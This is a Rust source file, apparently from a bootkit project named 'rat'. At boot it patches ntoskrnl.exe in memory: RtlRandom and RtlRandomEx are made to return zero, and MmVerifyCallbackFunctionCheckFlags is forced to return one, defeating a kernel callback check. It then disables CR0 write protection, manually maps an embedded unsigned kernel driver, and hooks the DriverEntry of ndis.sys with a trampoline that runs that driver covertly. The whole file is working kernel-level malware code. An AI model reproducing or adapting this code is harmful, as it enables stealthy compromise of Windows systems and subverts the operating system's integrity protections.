use core::arch::global_asm;
use core::{ptr, slice};

use log::{error, info, warn};
use rat_common::utils::get_function_code;
use rat_common::windows::kernel::KernelHandoff;
use rat_common::windows::utils::{return_one_patch, return_zero_patch};
use windows_sys::w;

use crate::utils;
use crate::utils::types::_LIST_ENTRY;
use crate::utils::{mapper, pe};

#[cfg(debug_assertions)]
const DRIVER: &[u8] =
    include_bytes!("../../../rat-driver/target/debug/rat_driver_package/rat_driver.sys");

#[cfg(not(debug_assertions))]
const DRIVER: &[u8] =
    include_bytes!("../../../rat-driver/target/release/rat_driver_package/rat_driver.sys");

const TARGET_HOOKED_DRIVER: *const u16 = w!("ndis.sys");

global_asm!(
    ".global DriverEntryHooked_trampoline",
    "DriverEntryHooked_trampoline:",
    "movabs r8, 0",  // extra: *const KernelHandoff
    "movabs rax, 0", // Entrypoint of DRIVER
    "jmp rax",
    ".global DriverEntryHooked_trampoline_end",
    "DriverEntryHooked_trampoline_end:",
);

unsafe extern "win64" {
    fn DriverEntryHooked_trampoline();
    fn DriverEntryHooked_trampoline_end();
}

fn _extract_mm_verify_callback_function_check_flags_candidates(
    function: &[u8],
    candidates: &mut [u64],
) {
    'f: for i in 0..function.len().saturating_sub(10) {
        if function[i] == 0xCC {
            break;
        }

        if function[i..i + 6]
            == [
                0xBA, 0x20, 0x00, 0x00, 0x00, // mov edx, 0x20
                0xE8, // call rel32
            ]
        {
            let rel32 = i32::from_le_bytes([
                function[i + 6],
                function[i + 7],
                function[i + 8],
                function[i + 9],
            ]);

            for target in candidates.iter_mut() {
                if *target == 0 {
                    *target = function[i + 10..]
                        .as_ptr()
                        .wrapping_byte_offset(rel32 as isize) as u64;
                    continue 'f;
                }
            }

            // If we got here, it means that the candidate list is already full
            break;
        }
    }
}

pub fn patch_ntoskrnl(
    ntoskrnl: &mut [u8],
    empty_buffer: &mut [u8],
    load_order_list_head: &_LIST_ENTRY,
) {
    info!("Patching ntoskrnl.exe...");
    let mut rtl_random_addr = ptr::null_mut();
    let mut rtl_random_ex_addr = ptr::null_mut();

    let mut ob_register_callbacks_candidates = [0; 2];
    unsafe {
        pe::iterate_export_address_table_mut(ntoskrnl, |name, function| {
            if name == c"RtlRandom" || name == c"RtlRandomEx" {
                let patched = return_zero_patch();
                function[..patched.len()].copy_from_slice(patched);
                info!(
                    "Patched function {name:?} at address {:p} ({} bytes)",
                    function.as_ptr(),
                    patched.len(),
                );

                if name == c"RtlRandom" {
                    rtl_random_addr = function[patched.len()..].as_mut_ptr();
                } else {
                    rtl_random_ex_addr = function[patched.len()..].as_mut_ptr();
                }
            } else if name == c"ObRegisterCallbacks" {
                _extract_mm_verify_callback_function_check_flags_candidates(
                    function,
                    &mut ob_register_callbacks_candidates,
                );
            }
            // We really want to correlate with the call to MmVerifyCallbackFunctionCheckFlags inside
            // PsSetCreateProcessNotifyRoutineEx, but it seems like the latter is just a wrapper
            // around PspSetCreateProcessNotifyRoutine, which is the one actually calling
            // MmVerifyCallbackFunctionCheckFlags.
            // Since extracting the address of PspSetCreateProcessNotifyRoutine and following that
            // call is a pain in the ass, we simply ignore it for now. Extracting ObRegisterCallbacks
            // is already giving correct result though.
        });
    }

    info!(
        "ObRegisterCallbacks: candidates for MmVerifyCallbackFunctionCheckFlags = {ob_register_callbacks_candidates:x?}",
    );

    let mm_verify_callback_function_check_flags = ob_register_callbacks_candidates[0];
    if mm_verify_callback_function_check_flags != 0 {
        let code = return_one_patch();
        unsafe {
            ptr::copy_nonoverlapping(
                code.as_ptr(),
                mm_verify_callback_function_check_flags as *mut u8,
                code.len(),
            );
        }

        info!("Patched MmVerifyCallbackFunctionCheckFlags with {code:02X?}");
    }

    if empty_buffer.is_empty() {
        warn!("No usuable buffer is provided. Some operations cannot be performed.");
        return;
    }

    let mapping = match unsafe { mapper::manual_map(DRIVER, load_order_list_head, empty_buffer) } {
        Some(mapping) => {
            info!(
                "Mapped kernel driver to allocated buffer, bytes on disk = {}, bytes in memory = 0x{:X} ({}), entrypoint offset = 0x{:X}",
                DRIVER.len(),
                mapping.size,
                mapping.size,
                mapping.entrypoint,
            );

            mapping
        }
        None => {
            error!("Cannot map kernel driver to allocated buffer");
            return;
        }
    };

    match unsafe { utils::get_boot_loaded_module(load_order_list_head, TARGET_HOOKED_DRIVER) } {
        Some(injected_driver) => {
            let entrypoint = injected_driver.kldr_entry.EntryPoint as *mut u8;
            info!("Patching target driver entrypoint at {entrypoint:p}");
            info!("First 32 bytes: {:02X?}", unsafe {
                slice::from_raw_parts(entrypoint, 32)
            });

            let trampoline = get_function_code(
                DriverEntryHooked_trampoline as *const u8,
                DriverEntryHooked_trampoline_end as *const u8,
            );

            let cr0 = utils::DisableWriteProtection::new();
            let driver_image_base = empty_buffer.as_ptr() as u64;
            let empty_buffer = &mut empty_buffer[mapping.size..];
            unsafe {
                let size = trampoline.len();
                let entrypoint = slice::from_raw_parts_mut(entrypoint, size);

                // Save original instructions to empty buffer
                empty_buffer[..size].copy_from_slice(entrypoint);

                // Construct KernelHandoff struct
                let handoff = KernelHandoff {
                    original_driver_entry: entrypoint.as_ptr() as *mut u8,
                    original_instructions: empty_buffer.as_ptr(),
                    original_instructions_len: size,
                    rtl_random_addr,
                    rtl_random_ex_addr,
                };
                let empty_buffer = &mut empty_buffer[size..];
                empty_buffer
                    .as_mut_ptr()
                    .cast::<KernelHandoff>()
                    .write_unaligned(handoff);

                // Patching imm64 addresses
                entrypoint.copy_from_slice(trampoline);
                entrypoint[2..10].copy_from_slice(&(empty_buffer.as_ptr() as u64).to_le_bytes());
                entrypoint[12..20].copy_from_slice(
                    &driver_image_base
                        .saturating_add(u64::from(mapping.entrypoint))
                        .to_le_bytes(),
                );

                info!("DriverEntry hook installed: {entrypoint:02X?}");
            }
            drop(cr0);
        }
        None => {
            warn!("No injected driver provided. DriverEntry hook will not be installed.");
            return;
        }
    }
}
